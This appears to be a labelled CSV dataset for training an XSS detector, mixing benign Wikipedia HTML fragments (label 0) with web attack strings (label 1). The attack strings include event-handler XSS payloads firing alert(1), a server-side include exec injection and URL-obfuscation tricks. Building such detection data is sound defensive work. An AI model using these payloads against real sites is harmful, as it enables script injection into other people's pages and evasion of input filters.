Sentence,Label
"<!--#exec cmd=""/bin/echo '<SCR'""-->",1
"<LINK REL=""stylesheet"" HREF=""http://.rocks/.css"">",1
"document.getElementsByClassName(""example"")",1
"<A HREF=""http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D""></A>",1
http://1113982867/,1
&#x00003C,1
"	 </span> <span class=""reference-text""><a rel=""nofollow"" class=""external text"" href=""https://dl.acm.org/citation.cfm?id=3204480.3186697"">Retrieved July 29 </a> ",0
			Print/export,0
"<link rel=""alternate"" type=""application/x-wiki"" title=""Edit this page"" href=""/w/index.php?title=Artificial_intelligence&amp;action=edit""/>",0
The Mathematical Objection:,0
"<script type=""text/javascript"" src=""_static/readthedocs-data.js""></script>",0
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=77"" title=""Edit section: External links"">edit </a><span class=""mw-editsection-bracket"">] ",0
<data onpointerup=alert(1)>XSS</data>,1
"	 </span> <span class=""reference-text""><cite class=""citation journal""><a href=""/wiki/Woody_Evans"" title=""Woody Evans"">Evans, Woody </a> (2015). ""Posthuman Rights: Dimensions of Transhuman Worlds"". <i>Teknokultura </i>. <b>12 </b> (2). <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.5209%2Frev_TK.2015.v12.n2.49072"">10.5209/rev_TK.2015.v12.n2.49072 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Teknokultura&amp;rft.atitle=Posthuman+Rights%3A+Dimensions+of+Transhuman+Worlds&amp;rft.volume=12&amp;rft.issue=2&amp;rft.date=2015&amp;rft_id=info%3Adoi%2F10.5209%2Frev_TK.2015.v12.n2.49072&amp;rft.aulast=Evans&amp;rft.aufirst=Woody&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
<animatetransform onpointerover=alert(1)>XSS</animatetransform>,1
"<li><a href=""/wiki/Evolutionary_algorithm"" title=""Evolutionary algorithm"">Evolutionary algorithm </a> </li>",0
<rt onblur=alert(1) tabindex=1 id=x></rt><input autofocus>,1
"<li class=""toclevel-3 tocsection-51""><a href=""#Existential_risk""><span class=""tocnumber"">8.2.1 ",0
"<plaintext onmouseover=""alert(1)"">test</plaintext>",1
"<li><a href=""/wiki/Cross-validation_(statistics)"" title=""Cross-validation (statistics)"">Cross-validation </a> </li> </ul>",0
<aside onpointerout=alert(1)>XSS</aside>,1
